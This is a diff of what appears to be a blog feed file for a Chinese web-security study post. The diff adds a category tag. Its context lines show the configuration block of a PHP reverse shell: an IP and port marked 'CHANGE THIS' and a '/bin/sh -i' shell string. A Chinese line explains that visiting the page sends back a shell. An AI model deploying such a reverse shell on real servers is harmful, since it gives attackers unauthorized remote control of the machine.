@@ -14,6 +14,9 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit (<span class="number">0</span>);</span><br><span class="line">$VERSION = <span class="string">"1.0"</span>;</span><br><span class="line">$ip = <span class="string">'127.0.0.1'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">1234</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line">$chunk_size = <span class="number">1400</span>;</span><br><span class="line">$write_a = <span class="keyword">null</span>;</span><br><span class="line">$error_a = <span class="keyword">null</span>;</span><br><span class="line">$shell = <span class="string">'uname -a; w; id; /bin/sh -i'</span>;</span><br><span class="line">$daemon = <span class="number">0</span>;</span><br><span class="line">$debug = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
 <p>修改上面的ip和端口,访问该页面就会反弹回来一个shell</p>
 ]]></content>
+      <categories>
+        <category>web安全学习</category>
+      </categories>
       <tags>
         <tag>shell</tag>
       </tags>
